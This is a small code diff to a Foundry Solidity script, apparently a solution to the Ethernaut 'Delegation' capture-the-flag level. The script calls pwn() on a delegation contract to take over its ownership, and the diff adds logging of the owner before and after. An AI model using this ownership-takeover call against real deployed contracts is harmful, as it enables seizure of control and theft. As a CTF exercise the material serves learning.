@@ -10,10 +10,12 @@ contract AttackerDelegationScript is Script {
     function run() external {
         vm.startBroadcast();
 
+        console.log("Current owner is : ", delegation.owner());
         (bool success, ) = address(delegation).call(
             abi.encodeWithSignature("pwn()")
         );
         require(success, "Call failed");
+        console.log("New owner is : ", delegation.owner());
 
         vm.stopBroadcast();
     }
